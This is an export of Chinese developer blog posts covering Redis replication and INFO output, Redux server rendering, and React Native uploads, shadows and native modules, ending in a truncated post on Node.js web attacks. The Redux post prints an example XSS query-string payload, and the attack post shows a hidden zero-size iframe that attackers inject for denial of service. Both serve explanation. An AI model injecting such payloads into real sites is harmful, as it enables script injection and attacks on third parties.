复制对于有扩展平台来适应更高负载经验的工程师来说，复制几乎是不可缺少的一部分。 （下面的服务器指的是 redis 服务） 复制可以让其他服务器拥有一个不断地更新的数据副本，从而使得拥有数据副本的服务器可以用来处理客户发送的 读 （写在主服务器）请求。 一个主服务器向多个从服务器发送更新，并使用从服务器来处理所有读请求，这样可以减轻主服务器的压力。 在接收到主服务器发送的数据初始副本之后，客户端每次向主服务器进行写入时，从服务器都会实时地得到更新。 在部署好主从服务器后，客户端就可以向任意一个从服务器发送读请求，而不必再像之前一样，总是把每个读请求都发送给主服务器（客户端通常是随机地选择使用哪个从服务器进行读操作，从而负载平均分配到各个从服务器上）。 当从服务器连接主服务器的时候，主服务器会执行 BGSAVE 操作（快照）。 redis 不支持主主复制，一个从服务器只能对应一个主服务器，一个主服务器可以对应多个从服务器。 从服务器也可以拥有自己的从服务器，这样就造成了主从链。 注意：主服务器能够进行读写操作，而从服务器只能进行读操作。 关于更多的复制知识参考：http://blog.jobbole.com/101678/ 配置服务先新复制一个redis.conf，再把修改 slaveof 选项为 slaveof host port，为主服务器的地址，再修改相关的文件路径，启动服务的端口。在启动 redis 时，使用这个配置文件，这就会变成从服务器，并连接主服务器。 可以使用命令：slaveof no one 来不再接收主服务器的更新。可以使用命令：slaveof host port 来开始复制一个新的主服务器。 看到类似以下信息输出表示，复制成功： 1234567891011* The server is now ready to accept connections on port 6380* Connecting to MASTER 127.0.0.1:6379* MASTER &lt;-&gt; SLAVE sync started* Non blocking connect for SYNC fired the event.* Master replied to PING, replication can continue...* Partial resynchronization not possible (no cached master)* Full resync from master: ebf2327aacacd7fddde3e4a70a3ec353be06fae0:4803* MASTER &lt;-&gt; SLAVE sync: receiving 8240 bytes from master* MASTER &lt;-&gt; SLAVE sync: Flushing old data* MASTER &lt;-&gt; SLAVE sync: Loading DB in memory* MASTER &lt;-&gt; SLAVE sync: Finished with success 性能测试Redis 性能测试是通过同时执行多个命令实现的。 语法 redis-benchmark [option] [option value] 12# 用 10000 个请求来测试redis-benchmark -n 10000 下面是一些测试结果，大概的说明一下： 12345678910111213====== SET ====== 10000 requests completed in 0.25 seconds # 10000 个请求，完成全部需要 0.25s 50 parallel clients # 50 个并发客户端测试 3 bytes payload # 3 字节的载荷数据 keep alive: 1 # ?47.00% &lt;= 1 milliseconds # 47.00% 的在 1ms 内完成98.94% &lt;= 2 milliseconds # 99.94% 的在 2ms 内完成99.51% &lt;= 15 milliseconds99.53% &lt;= 16 milliseconds99.83% &lt;= 17 milliseconds100.00% &lt;= 17 milliseconds # 100% 的在 17ms 内完成40160.64 requests per second # 每秒可以处理 40160.64 个请求 info在 redis-cli 里输入 info 可以获取，redis 服务的相关信息： Server （服务）： 123456789101112131415161718# Serverredis_version:3.2.100 # redis 版本redis_git_sha1:00000000redis_git_dirty:0redis_build_id:dd26f1f93c5130eeredis_mode:standaloneos:Windows # 操作系统arch_bits:64 # 系统位数multiplexing_api:WinSock_IOCPprocess_id:7180 # pidrun_id:65f1eb0610351fc5c3ee9070cc9d2ea5ccb348e3tcp_port:6379 # 端口uptime_in_seconds:3876 # 运行时间（秒）uptime_in_days:0 # 运行天数（天）hz:10lru_clock:4523938executable:D:\\redis-server # 启动命令路径config_file: # 启动配置文件 Clients （客户端）： 123456# Clientsconnected_clients:2 # 客户端连接数connected_slaves:0 # 从服务数client_longest_output_list:0client_biggest_input_buf:0blocked_clients:0 Memory （内存）： 12345678910111213141516# Memoryused_memory:710560 # Redis 使用的内存总量used_memory_human:693.91K # Redis 使用的内存总量used_memory_rss:672784 # Redis 使用的内存总量(包括内存碎片)used_memory_rss_human:657.02K # Redis 使用的内存总量(包括内存碎片)used_memory_peak:1269984 # Redis 所用内存的高峰值used_memory_peak_human:1.21M # Redis 所用内存的高峰值total_system_memory:0total_system_memory_human:0Bused_memory_lua:37888used_memory_lua_human:37.00Kmaxmemory:0maxmemory_human:0Bmaxmemory_policy:noevictionmem_fragmentation_ratio:0.95 # Redis 内存碎片比率mem_allocator:jemalloc-3.6.0 Persistence （持久化）: 123456789101112131415# Persistenceloading:0rdb_changes_since_last_save:0 # 上次保存数据库之后，执行命令的次数rdb_bgsave_in_progress:0 # 后台进行中的 save 操作的数量rdb_last_save_time:1497696158 # 最后一个使用 BGSAVE 的时间戳rdb_last_bgsave_status:ok # 最后一次的 BGSAVE 状态rdb_last_bgsave_time_sec:0 # 最后一次的 BGSAVE 执行的时间（秒）rdb_current_bgsave_time_sec:-1aof_enabled:0 # Redis 是否开启了 AOFaof_rewrite_in_progress:0 # 后台进行中的 AOF 文件修改操作的数量aof_rewrite_scheduled:0aof_last_rewrite_time_sec:-1 # 最后一次 AOF 的时间aof_current_rewrite_time_sec:-1aof_last_bgrewrite_status:ok # AOF 后台写入状态aof_last_write_status:ok # AOF 写入状态 Stats （状态）： 1234567891011121314151617181920# Statstotal_connections_received:1 # 运行以来连接过的客户端的总数量total_commands_processed:128 # 运行以来执行过的命令的总数量instantaneous_ops_per_sec:0total_net_input_bytes:10116 # 请求的字节大小total_net_output_bytes:5918188 # 响应的字节大小instantaneous_input_kbps:0.00 # 输入速度（kb/s）instantaneous_output_kbps:0.04 # 输出速度（kb/s）rejected_connections:0 # 拒绝连接数sync_full:0sync_partial_ok:0sync_partial_err:0expired_keys:0 # 运行以来过期的 key 的数量evicted_keys:0 # 运行以来删除过的 key 的数量keyspace_hits:3 # 命中 key 的次数keyspace_misses:0 # 不命中 key 的次数pubsub_channels:0 # 当前使用中的频道数量pubsub_patterns:0 # 当前使用的模式的数量latest_fork_usec:126008migrate_cached_sockets:0 Replication （复制）： 12345678910111213141516# Replicationrole:slave # 角色（slave 为 从）master_host:127.0.0.1 # 主 hostmaster_port:6379 # 主 portmaster_link_status:up # 连接状态master_last_io_seconds_ago:5 # 与主连接发生在多少秒之前master_sync_in_progress:0slave_repl_offset:5761slave_priority:100slave_read_only:1 # 从连接数connected_slaves:0master_repl_offset:0repl_backlog_active:0repl_backlog_size:1048576repl_backlog_first_byte_offset:0repl_backlog_histlen:0 CPU &amp; Cluster &amp; Keyspace （CPU &amp; 集群 &amp; 空间）： 1234567891011# CPUused_cpu_sys:0.14 # 系统 cpu 使用率used_cpu_user:0.05 # Redis cpu 使用率used_cpu_sys_children:0.00 # 子进程 cpu 使用率used_cpu_user_children:0.00 # 子进程 cpu 使用率# Clustercluster_enabled:0 # 是否开启了集群# Keyspacedb0:keys=5,expires=0,avg_ttl=0 # 各个数据库编号的 key 的数量，以及带有生存期的 key 的数量","categories":[{"name":"Redis","slug":"Redis","permalink":"http://me.lizhooh.com/categories/Redis/"}],"tags":[{"name":"数据库","slug":"数据库","permalink":"http://me.lizhooh.com/tags/数据库/"},{"name":"NoSQL","slug":"NoSQL","permalink":"http://me.lizhooh.com/tags/NoSQL/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"Redis","slug":"Redis","permalink":"http://me.lizhooh.com/tags/Redis/"}]},{"title":"React，Redux 服务端渲染","slug":"Redux/React，Redux 服务端渲染","date":"2017-06-07T14:01:38.000Z","updated":"2021-06-15T06:10:52.890Z","comments":true,"path":"/stories/2017/06/Redux/React，Redux 服务端渲染/","link":"","permalink":"http://me.lizhooh.com/stories/2017/06/Redux/React，Redux 服务端渲染/","excerpt":"服务端渲染再次把服务端渲染（Nodejs）的话题搬到这里。服务端渲染一个很常见的场景是当用户（或搜索引擎爬虫）第一次请求页面时，用它来做初始渲染。当服务器接收到请求后，它把需要的组件渲染成 HTML 字符串，然后把它返回给客户端（这里统指浏览器）。之后，客户端会接手渲染控制权。","text":"服务端渲染再次把服务端渲染（Nodejs）的话题搬到这里。服务端渲染一个很常见的场景是当用户（或搜索引擎爬虫）第一次请求页面时，用它来做初始渲染。当服务器接收到请求后，它把需要的组件渲染成 HTML 字符串，然后把它返回给客户端（这里统指浏览器）。之后，客户端会接手渲染控制权。 服务端使用 Redux当在服务器使用 Redux 渲染时，一定要在响应中包含应用的 state，这样客户端可以把它作为初始 state。这点至关重要，因为如果在生成 HTML 前预加载了数据，我们希望客户端也能访问这些数据。否则，客户端生成的 HTML 与服务器端返回的 HTML 就会不匹配，客户端还需要重新加载数据。 把数据发送到客户端，需要以下步骤： 为每次请求创建全新的 Redux store 实例： 按需 dispatch 一些 action； 从 store 中取出 state； 把 state 一同返回给客户端。 在客户端，使用服务器返回的 state 创建并初始化一个全新的 Redux store。Redux 在服务端惟一要做的事情就是，提供应用所需的初始 state。 最重要的是要保持服务端与客户端的数据一致性，而服务器中的初始状态一般从数据库那里得到。 开始下面来介绍如何配置服务端渲染。使用极简的 Counter 计数器应用 来做示例，介绍如何根据请求在服务端提前渲染 state。 安装：本例会使用 Express 来做 web 服务器。还需要安装 Redux 对 React 的绑定库，Redux 默认并不包含。 1npm install --save express react-redux 注意：要兼容import，最快的方式是使用bable-node取代node命令的使用。 服务端开发下面是服务端代码大概的样子。使用 app.use 挂载 Express middleware 处理所有请求。 server.js | 服务端入口文件 12345678910111213141516171819import path from 'path';import Express from 'express';import React from 'react';import &#123; createStore &#125; from 'redux';import &#123; Provider &#125; from 'react-redux';import counterApp from './reducers';import App from './containers/App';const app = Express();const port = 3000;// 每当收到请求时都会触发app.use(handleRender);// 接下来会补充这部分代码function handleRender(req, res) &#123; /* ... */ &#125;function renderFullPage(html, initialState) &#123; /* ... */ &#125;app.listen(port); 处理请求第一件要做的事情就是对每个请求创建一个新的Redux store实例。这个 store 惟一作用是提供应用初始的 state。渲染时，使用&lt;Provider&gt;来包住根组件&lt;App /&gt;，以此来让组件树中所有组件都能访问到 store，就像之前的搭配 React 教程讲的那样。服务端渲染最关键的一步是在发送响应前渲染初始的 HTML。这就要使用 React.renderToString()。然后使用store.getState() 从 store 得到初始 state。renderFullPage 函数会介绍接下来如何传递。 1234567891011121314151617181920import &#123; renderToString &#125; from 'react-dom/server'function handleRender(req, res) &#123; // 创建新的 Redux store 实例, counterApp 是 reducer const store = createStore(counterApp); // 把组件渲染成字符串 const html = renderToString( &lt;Provider store=&#123;store&#125;&gt; &lt;App /&gt; &lt;/Provider&gt; ); // 从 store 中获得初始 state const initialState = store.getState(); // 把渲染后的页面内容发送给客户端 res.send(renderFullPage(html, initialState));&#125; 注入初始组件的 HTML 和 State服务端最后一步就是把初始组件的 HTML 和初始 state 注入到客户端能够渲染的模板中。如何传递 state 呢，我们添加一个&lt;script&gt;标签来把initialState赋给window.__INITIAL_STATE__。客户端可以通过window.__INITIAL_STATE__获取initialState。同时使用 script 标签来引入打包后的 js bundle 文件。之前引入的 serve-static middleware 会处理它的请求。下面是代码。 1234567891011121314151617function renderFullPage(html, initialState) &#123; return ` &lt;!doctype html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Redux Universal Example&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"root\"&gt;$&#123;html&#125;&lt;/div&gt; &lt;script&gt; window.__INITIAL_STATE__ = $&#123;JSON.stringify(initialState)&#125; &lt;/script&gt; &lt;script src=\"/static/bundle.js\"&gt;&lt;/script&gt; &lt;/body&gt; &lt;/html&gt; `;&#125; 客户端开发客户端代码非常直观。只需要从window.__INITIAL_STATE__得到初始 state，并传给 createStore() 函数即可。 client.js | 客户端代码 12345678910111213141516171819import React from 'react'import &#123; render &#125; from 'react-dom'import &#123; createStore &#125; from 'redux'import &#123; Provider &#125; from 'react-redux'import App from './containers/App'import counterApp from './reducers'// 通过服务端注入的全局变量得到初始 stateconst initialState = window.__INITIAL_STATE__// 使用初始 state 创建 Redux storeconst store = createStore(counterApp, initialState)render( &lt;Provider store=&#123;store&#125;&gt; &lt;App /&gt; &lt;/Provider&gt;, document.getElementById('root')); 你可以选择自己喜欢的打包工具（Webpack, Browserify 或其它）来编译并打包文件到dist/bundle.js。 当页面加载时，打包后的 js 会启动，并调用React.render()，然后会与服务端渲染的 HTML 的data-react-id属性做关联。这会把新生成的 React 实例与服务端的虚拟 DOM 连接起来。因为同样使用了来自 Redux store 的初始 state，并且 view 组件代码是一样的，结果就是我们得到了相同的 DOM。 就是这样！这就是实现服务端渲染的所有步骤。 但这样做还是比较原始的。只会用动态代码渲染一个静态的 View。下一步要做的是动态创建初始 state 支持动态渲染 view。 处理 Request 参数服务端收到的惟一输入是来自浏览器的请求。在服务器启动时可能需要做一些配置（如运行在开发环境还是生产环境），但这些配置是静态的。 请求会包含 URL 请求相关信息，包括请求参数，它们对于做 React Router 路由时可能会有用。也可能在请求头里包含 cookies，鉴权信息或者 POST 内容数据。下面演示如何基于请求参数来得到初始 state。 server.js | 处理请求数据 123456789101112131415161718192021222324252627import qs from 'qs'; // 添加到文件开头import &#123; renderToString &#125; from 'react-dom/server'function handleRender(req, res) &#123; // 如果存在的话，从 request 读取 counter const params = qs.parse(req.query) const counter = parseInt(params.counter) || 0 // 得到初始 state let initialState = &#123; counter &#125; // 创建新的 Redux store 实例 const store = createStore(counterApp, initialState) // 把组件渲染成字符串 const html = renderToString( &lt;Provider store=&#123;store&#125;&gt; &lt;App /&gt; &lt;/Provider&gt; ) // 从 Redux store 得到初始 state const finalState = store.getState() // 把渲染后的页面发给客户端 res.send(renderFullPage(html, finalState))&#125; 服务端渲染常用的场景是处理异步 state。因为服务端渲染天生是同步的，因此异步的数据获取操作对应到同步操作非常重要。 最简单的做法是往同步代码里传递一些回调函数。在这个回调函数里引用响应对象，把渲染后的 HTML 发给客户端。不要担心，并没有想像中那么难。 本例中，我们假设有一个外部数据源提供计算器的初始值（所谓的把计算作为一种服务）。我们会模拟一个请求并使用结果创建初始 state。API 请求代码如下： api/counter.js | 模拟 从数据库里读数据 123456789function getRandomInt(min, max) &#123; return Math.floor(Math.random() * (max - min)) + min&#125;export function fetchCounter(callback) &#123; setTimeout(() =&gt; &#123; callback(getRandomInt(1, 100)) &#125;, 500)&#125; 再次说明一下，这只是一个模拟的 API，我们使用 setTimeout 模拟一个需要 500 毫秒的请求（实现项目中 API 请求一般会更快）。传入一个回调函数，它异步返回一个随机数字。如果你使用了基于 Promise 的 API 工具，那么要把回调函数放到 then 中。 在服务端，把代码使用 fetchCounter 包起来，在回调函数里拿到结果： server.js 12345678910111213141516171819202122232425262728293031// 添加到 importimport &#123; fetchCounter &#125; from './api/counter'import &#123; renderToString &#125; from 'react-dom/server'function handleRender(req, res) &#123; // 异步请求模拟的 API fetchCounter(apiResult =&gt; &#123; // 如果存在的话，从 request 读取 counter const params = qs.parse(req.query) const counter = parseInt(params.counter) || apiResult || 0 // 得到初始 state let initialState = &#123; counter &#125; // 创建新的 Redux store 实例 const store = createStore(counterApp, initialState) // 把组件渲染成字符串 const html = renderToString( &lt;Provider store=&#123;store&#125;&gt; &lt;App /&gt; &lt;/Provider&gt; ) // 从 Redux store 得到初始 state const finalState = store.getState() // 把渲染后的页面发给客户端 res.send(renderFullPage(html, finalState)) &#125;);&#125; 实际上，不应该使用callback的做法，而是使用Promise + Async。 安全注意事项因为我们代码中很多是基于用户生成内容（UGC）和输入的，不知不觉中，提高了应用可能受攻击区域。任何应用都应该对用户输入做安全处理以避免跨站脚本攻击（XSS）或者代码注入。 我们的示例中，只对安全做基本处理。当从请求中拿参数时，对 counter 参数使用 parseInt 把它转成数字。如果不这样做，当 request 中有 script 标签时，很容易在渲染的 HTML 中生成危险代码。就像这样的：?counter=&lt;/script&gt;&lt;script&gt;doSomethingBad();&lt;/script&gt; 参考资料 http://www.redux.org.cn/docs/recipes/ServerRendering.html","categories":[{"name":"Redux","slug":"Redux","permalink":"http://me.lizhooh.com/categories/Redux/"}],"tags":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"Redux","slug":"Redux","permalink":"http://me.lizhooh.com/tags/Redux/"},{"name":"服务端渲染","slug":"服务端渲染","permalink":"http://me.lizhooh.com/tags/服务端渲染/"}]},{"title":"React Native 文件上传","slug":"React Native/IO/React Native 文件上传","date":"2017-06-03T00:54:34.000Z","updated":"2021-06-15T06:10:52.853Z","comments":true,"path":"/stories/2017/06/React Native/IO/React Native 文件上传/","link":"","permalink":"http://me.lizhooh.com/stories/2017/06/React Native/IO/React Native 文件上传/","excerpt":"Fetch要想在 React Native 上实现文件上传其实挺简单的，主要是 React Native 的网络编程部分是可以使用 Fetch 来操作的。 那么就可以用 Fetch 的文件上传来显示了。也就是 HTML5 的 API。","text":"Fetch要想在 React Native 上实现文件上传其实挺简单的，主要是 React Native 的网络编程部分是可以使用 Fetch 来操作的。 那么就可以用 Fetch 的文件上传来显示了。也就是 HTML5 的 API。 12345678910111213141516171819202122232425/* * 上传图片请求 * @param&#123;String&#125; uri 图片地址 */uploadImage(uri) &#123; let formData = new FormData(); let file = &#123; uri: uri, // 图片的 uri，可以是本地路径，也可以是网络地址，也可以是 base64 type: 'multipart/form-data', name: 'a.jpg' // 必须填写，不然会出错 &#125;; formData.append('files', file); // key return fetch('http://127.0.0.1:3000', &#123; method:'POST', headers:&#123; 'Content-Type':'multipart/form-data', &#125;, body: formData, &#125;) .then(res =&gt; res.json()) .then(json =&gt; console.log(json)) .catch(err =&gt; console.error(err))&#125; formData 的使用参考：https://github.com/form-data/form-data 进度条fetch 是不支持上传进度的，因为它不是 Ajax 框架。这时候可以使用axios来支持进度条。 123456789101112131415161718192021222324/* * 上传图片请求 * @param&#123;String&#125; uri 图片地址 */uploadImage(uri) &#123; let formData = new FormData(); let file = &#123; uri: uri, type: 'multipart/form-data', name: 'a.jpg' // 必须填写，不然会出错 &#125;; formData.append(\"files\", file); // key return axios.post('http://127.0.0.1:3000', formData, &#123; onUploadProgress: progressEvent =&gt; &#123; console.log(progressEvent); // 监听上传进度 &#125; &#125;) .then(res =&gt; res.data) .then(json =&gt; console.log(json)) .catch(err =&gt; console.error(err))&#125;","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"React Native 在 Android 上实现阴影效果","slug":"React Native/React Native 在 Android 上实现阴影效果","date":"2017-05-28T09:13:37.000Z","updated":"2021-06-15T06:10:52.861Z","comments":true,"path":"/stories/2017/05/React Native/React Native 在 Android 上实现阴影效果/","link":"","permalink":"http://me.lizhooh.com/stories/2017/05/React Native/React Native 在 Android 上实现阴影效果/","excerpt":"ShadowShadow阴影效果，在 ios 上是完全支持的，但在 Android 上只有 5.0 以上的系统支持类似的阴影效果（用elevation来实现)。无赖，看了一下别人的react-native-shadow封装库，是用SVG实现，坑爹的是在新版本上运行不起来（作者好久没更新了，issue 又没反应）。 奈何，我不会 SVG，还好会 CSS3，后来还是用 CSS3 搞定了。 WebView下面的方法是用 CSS3 在 WebView 上模拟效果，通过元素的叠加来达到预期的效果。 实现的效果就是，下面右下方带阴影的圆形按钮：","text":"ShadowShadow阴影效果，在 ios 上是完全支持的，但在 Android 上只有 5.0 以上的系统支持类似的阴影效果（用elevation来实现)。无赖，看了一下别人的react-native-shadow封装库，是用SVG实现，坑爹的是在新版本上运行不起来（作者好久没更新了，issue 又没反应）。 奈何，我不会 SVG，还好会 CSS3，后来还是用 CSS3 搞定了。 WebView下面的方法是用 CSS3 在 WebView 上模拟效果，通过元素的叠加来达到预期的效果。 实现的效果就是，下面右下方带阴影的圆形按钮： 先是在 html 里用 div 画出一个圆形阴影元素： 1234567&lt;div style=\" box-shadow: 0 1px 8px #777; width: 100%; height: 100%; border-radius: 50%; \"&gt;&lt;/div&gt; 然后是组件样式： 12345678910111213141516171819const FloatButtonStyles = StyleSheet.create(&#123; webview: &#123; width: 65, height: 65, backgroundColor: 'rgba(1, 1, 1, 0)', alignItems: 'center', justifyContent: 'center', position: 'absolute', &#125;, touch: &#123; width: 45, height: 45, borderRadius: 45, backgroundColor: 'rgba(1, 1, 1, 0)', alignItems: 'center', justifyContent: 'center', position: 'absolute', &#125;&#125;); 然后组件化： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950/** * 带阴影效果的悬浮按钮 * 默认在右下 (20, 20) 处 * 注意： 要放在想要依赖的组件后面 * @param&#123;Number&#125; x 横向坐标 * @param&#123;Number&#125; y 竖向坐标 * @param&#123;Function&#125; onPress 点击触发 * @param&#123;String&#125; icon.name 图标名称 * @param&#123;String&#125; icon.color 图标颜色 * @param&#123;Number&#125; icon.size 图标大小 */export const FloatButton = (&#123; x = 0, y = 0, colors = color, onPress = null, icon = &#123;&#125;,&#125;) =&gt; &#123; icon = Object.assign(&#123; name: 'add', size: 32, color: '#fff', &#125;, icon); const $ = FloatButtonStyles; return ( &lt;View&gt; &#123;/* 圆形按钮： 使用 css3 来模拟阴影效果 */&#125; &lt;WebView style=&#123;[$.webview, &#123; right: 15 + x, top: -80 + y &#125;]&#125; source=&#123;&#123; html: ` &lt;div style=\" box-shadow: 0 1px 8px #aaa; width: 100%; height: 100%; border-radius: 50%; background-color: $&#123;colors&#125; \"&gt; &lt;/div&gt; ` &#125;&#125; /&gt; &lt;Touch style=&#123;[$.touch, &#123; right: 25 + x, top: -70 + y &#125;]&#125; onPress=&#123;onPress&#125;&gt; &lt;MaterialIcons name=&#123;icon.name&#125; size=&#123;icon.size&#125; color=&#123;icon.color&#125; /&gt; &lt;/Touch&gt; &lt;/View&gt; );&#125; 使用： 1&lt;FloatButton onPress=&#123;this.onCreateLife&#125; /&gt; 性能用WebView实现的，在加载时会有 0.1s - 0.3s 左右的时间，这是加载 DOM 的时间。不过，别大量用在ListView上就不成问题了。","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"React Native [ 混合开发 ] 自定义原生模块 - 入门","slug":"React Native/React Native [ 混合开发 ] 自定义原生模块 - 入门","date":"2017-05-25T12:46:32.000Z","updated":"2021-06-15T06:10:52.860Z","comments":true,"path":"/stories/2017/05/React Native/React Native [ 混合开发 ] 自定义原生模块 - 入门/","link":"","permalink":"http://me.lizhooh.com/stories/2017/05/React Native/React Native [ 混合开发 ] 自定义原生模块 - 入门/","excerpt":"原生模块有时候 App 需要访问平台 API，但 React Native 可能还没有相应的模块包装；或者你需要复用一些 Java 代码，而不是用 Javascript 重新实现一遍；又或者你需要实现某些高性能的、多线程的代码，譬如图片处理、数据库、或者各种高级扩展等等。 这时候就需要自己去 自定义原生模块。","text":"原生模块有时候 App 需要访问平台 API，但 React Native 可能还没有相应的模块包装；或者你需要复用一些 Java 代码，而不是用 Javascript 重新实现一遍；又或者你需要实现某些高性能的、多线程的代码，譬如图片处理、数据库、或者各种高级扩展等等。 这时候就需要自己去 自定义原生模块。 自定义原生模块分为两种： 不带 UI 的模块。 带 UI 的模块。 这里讲述的是不带 UI 的模块，大致的流程如下： 创建模块名。 提供 js 层可用的常量。 提供 js 层调用的方法。 注册模块到 ReactPackage 里。 提供事件相关接口（可选）。 在 js 端导出调用的接口。 Toast 模块下面讲述的是，自定义一个MyToastAndroid原生的模块，功能与ToastAndroid一样。主要是React-Native发送命令给Android Java，Android Java调用原生组件。 自定义一个原生模块一般会经历几个步骤： 创建一个自定义的原生模块 创建一个自定义的原生模块包 注册到 React-native 的 ReactPackage 里 从 NativeModules 里导出使用 项目的文件结构： 1234567com // 在 app/src/main/java/com├── module // 自定义的原生模块│ ├── ToastModule.java│ └── ToastModulePackage.java└── testnat // App activity ├── MainActivity.java └── MainApplication.java 创建一个自定义的原生模块代码写在 ToastModule.java 里。记住，这里有很多套路的写法： 引入一些包 1234567891011121314// 所在的包package com.module;// react-native 相关的 [必须]import com.facebook.react.bridge.NativeModule;import com.facebook.react.bridge.ReactApplicationContext;import com.facebook.react.bridge.ReactContext;import com.facebook.react.bridge.ReactContextBaseJavaModule;import com.facebook.react.bridge.ReactMethod;// java, android 相关import android.widget.Toast;import java.util.Map;import java.util.HashMap; 编写 ToastModule 类 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152// 注意：需要继承至 ReactContextBaseJavaModulepublic class ToastModule extends ReactContextBaseJavaModule &#123; private static final String DURATION_SHORT_KEY = \"SHORT\"; private static final String DURATION_LONG_KEY = \"LONG\"; // 构造函数 public ToastModule(ReactApplicationContext reactContext) &#123; super(reactContext); &#125; /** * [必须] * 原生模块名称，用来在 React-native 里引用的 * 通过 React-native.NativeModules.MyToastAndroid 来访问 */ @Override public String getName() &#123; return \"MyToastAndroid\"; &#125; /** * 定义一些静态常量，产生一种映射关系 * 例如 MyToastAndroid.LONG =&gt; Toast.LENGTH_LONG */ @Override public Map&lt;String, Object&gt; getConstants() &#123; final Map&lt;String, Object&gt; constants = new HashMap&lt;&gt;(); constants.put(DURATION_SHORT_KEY, Toast.LENGTH_SHORT); constants.put(DURATION_LONG_KEY, Toast.LENGTH_LONG); return constants; &#125; /** * 导出一个方法给JavaScript使用 * 1. Java 方法需要使用注解 @ReactMethod，这样才能在 react-native 中调用 * 2. 方法的返回类型必须为 void，因为它是异步进行的 * 3. 在 react-native 中调用方式： 模块名.方法名 * 4. React Native 的跨语言访问是异步进行的，所以使用 回调函数 或者 发送事件消息 */ @ReactMethod public void show(String message, int duration) &#123; // 调用原生模块 Toast.makeText( this.getReactApplicationContext(), \"My: \" + message, // &lt;-- 添加一个 'My: ' 为了区别效果 duration ).show(); &#125;&#125; 下面的参数类型在 @ReactMethod 注明的方法中，会被直接映射到它们对应的 JavaScript 类型。 java javascript Boolean Bool Integer Number Double Number Float Number String String Callback function ReadableMap Object ReadableArray Array 创建一个自定义的原生模块包代码写在 ToastModulePackage.java 里。记住，这里有很多套路的写法： 引入一些包 1234567891011121314// 所在的包package com.module;// react-native 相关的 [必须]import com.facebook.react.ReactPackage;import com.facebook.react.bridge.JavaScriptModule;import com.facebook.react.bridge.NativeModule;import com.facebook.react.bridge.ReactApplicationContext;import com.facebook.react.uimanager.ViewManager;// java, android 相关import java.util.ArrayList;import java.util.Collections;import java.util.List; 编写 ToastModulePackage 类 123456789101112131415161718192021222324// 注意：需要继承至 ReactPackagepublic class ToastModulePackage implements ReactPackage &#123; // js 模块, ? 指的是： 类型未指定，但是继承至 JavaScriptModule @Override public List&lt;Class&lt;? extends JavaScriptModule&gt;&gt; createJSModules() &#123; return Collections.emptyList(); &#125; // 视图模块 @Override public List&lt;ViewManager&gt; createViewManagers(ReactApplicationContext reactContext) &#123; return Collections.emptyList(); &#125; // 原生模块 [必须] @Override public List&lt;NativeModule&gt; createNativeModules(ReactApplicationContext reactContext) &#123; List&lt;NativeModule&gt; modules = new ArrayList&lt;&gt;(); modules.add(new ToastModule(reactContext)); return modules; &#125;&#125; 注册到 React-native 的 ReactPackage 里在 MainApplication.java 里 引入刚才的包 12// 自定义模块包import com.module.ToastModulePackage; 注册 123456protected List&lt;ReactPackage&gt; getPackages() &#123; return Arrays.&lt;ReactPackage&gt;asList( new MainReactPackage(), new ToastModulePackage() // &lt;-- 添加到这里 );&#125; 从 NativeModules 里导出使用到了这里，基本已经成功了。 12345import React from 'react';import &#123; NativeModules &#125; from 'react-native';// 导出自定义的模块export default NativeModules.MyToastAndroid; // &lt;-- 刚才 getName 返回的名称 接着就可以这样使用： 12345678910111213// 自定义的模块import MyToastAndroid from './MyToastAndroid';export default class testnat extends Component &#123; componentDidMount() &#123; MyToastAndroid.show(\"啪啪啪\", MyToastAndroid.LONG); &#125; render() &#123; return &lt;View&gt;&lt;/View&gt;; &#125;&#125; 运行效果 参考资料 https://facebook.github.io/react-native/docs/native-modules-android.html","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"Nodejs Web 攻击","slug":"网络安全/Nodejs Web 攻击","date":"2017-05-21T00:29:32.000Z","updated":"2021-06-15T06:10:52.922Z","comments":true,"path":"/stories/2017/05/网络安全/Nodejs Web 攻击/","link":"","permalink":"http://me.lizhooh.com/stories/2017/05/网络安全/Nodejs Web 攻击/","excerpt":"前言最近看书发现了几个比较有趣的 Web 攻击技术，这里记录一下。相关的是应用层 Dos 拒绝服务攻击。 应用层和网络层的 Dos最经典的网络层 Dos 就是 SYN flood，它利用了 tcp 协议的设计缺陷，由于 tcp 协议的广泛使用，所以目前想要根治这个漏洞是不可能的。 攻击者首先使用大量肉鸡服务器并伪造源 IP 地址，向服务器发送 SYN 包，希望建立 tcp 连接，服务器就会正常响应 SYN/ACK 包，等待客户端响应。攻击客户端并不会响应这些 SYN/ACk 包，服务器端判断客户端超时就会丢掉这个连接。 如果这些攻击连接数量巨大，最终服务器就会因为等待和频繁处理这种半连接而失去对正常请求的响应，从而导致拒绝服务攻击成功。 往往黑客在攻陷了几个大流量的网站后，会注入以下代码： 1&lt;iframe src=\"...\" style=\"width: 0; height: 0\"&gt;&lt;/iframe&gt; 